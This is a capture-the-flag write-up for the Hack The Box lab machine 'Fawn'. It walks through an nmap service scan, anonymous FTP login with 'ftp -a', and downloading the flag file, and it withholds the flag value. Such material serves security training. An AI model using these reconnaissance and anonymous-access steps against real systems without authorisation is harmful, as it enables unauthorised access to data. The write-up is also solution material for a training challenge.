# Fawn
#HTB #very-easy #FTP #networks-services
## Target: 
*Name:* Fawn
*IP:* 10.129.126.213
## Vulnerability: 
Anonymous login on FTP service was enabled.
## Steps: 
#### 1) Reconnaissance
Used nmap to check for open ports: 

**Code:**
```
nmap -sV 10.129.126.213
```
**Result:**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-29 06:44 -0400
Nmap scan report for 10.129.126.213
Host is up (0.033s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.34 seconds
```

#### 2) Trying to connect to ftp
Using the `ftp -?` command, the help section is displayed: 
```
┌──(___________)-[~]
└─$ ftp -?
usage: ftp [-46AadefginpRtVv] [-b BUFSIZE] [-H HEADER] [-N NETRC] [-o OUTPUT]
           [-P PORT] [-q QUITTIME] [-r RETRY] [-s SRCADDR] [-T DIR,MAX[,INC]]
           [-x XFERSIZE]
           [[USER@]HOST [PORT]]
           [[USER@]HOST:[PATH][/]]
           [file:///PATH]
           [ftp://[USER[:PASSWORD]@]HOST[:PORT]/PATH[/][;type=TYPE]]
           [http://[USER[:PASSWORD]@]HOST[:PORT]/PATH]
           [https://[USER[:PASSWORD]@]HOST[:PORT]/PATH]
           ...
       ftp -u URL FILE ...
       ftp -?
  -4            Only use IPv4 addresses
  -6            Only use IPv6 addresses
  -A            Force active mode
  -a            Use anonymous login
  -b BUFSIZE    Use BUFSIZE bytes for fetch buffer
  -d            Enable debugging
  -e            Disable command-line editing
  -f            Force cache reload for FTP or HTTP proxy transfers
  -g            Disable file name globbing
  -H HEADER     Add custom HTTP header HEADER for HTTP transfers;
                may be repeated for additional headers
  -i            Disable interactive prompt during multiple file transfers
  -N NETRC      Use NETRC instead of ~/.netrc
  -n            Disable auto-login
  -o OUTPUT     Save auto-fetched files to OUTPUT
  -P PORT       Use port PORT
  -p            Force passive mode
  -q QUITTIME   Quit if connection stalls for QUITTIME seconds
  -R            Restart non-proxy auto-fetch
  -r RETRY      Retry failed connection attempts after RETRY seconds
  -s SRCADDR    Use IP source address SRCADDR
  -T DIR,MAX[,INC]
                Set maximum transfer rate for direction DIR (all, get, or put)
                to MAX bytes/s, with optional increment INC bytes/s
  -t            Enable packet tracing
  -u URL        URL to upload file arguments to
  -V            Disable verbose and progress
  -v            Enable verbose and progress
  -x XFERSIZE   Set socket send and receive size to XFERSIZE bytes
  -?            Display this help and exit

```

It indicates that we can use -a for anonymous login, we can try that using the code: 
```
ftp -a 10.129.126.213
```

This successfully connects us to the server's FTP.
```
Connected to 10.129.126.213.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
#### 3) Searching for the flag
Using `ls` command, we found the file `flag.txt` easily:
```
ftp> ls
229 Entering Extended Passive Mode (|||60219|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
```
#### 4) Downloading and reading the file
After finding the file, we need to download it to our machine using `get` command, then open it.

```
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||49621|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |**************************************************************************************|    32       15.31 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (1.51 KiB/s)
```

```
┌──(_________)-[~]
└─$ cat flag.txt               
<FLAG> 
```
## Flag: 
[Not disclosed — solve it yourself!]
## Key takeaway:
Always try if a service allows anonymous login.
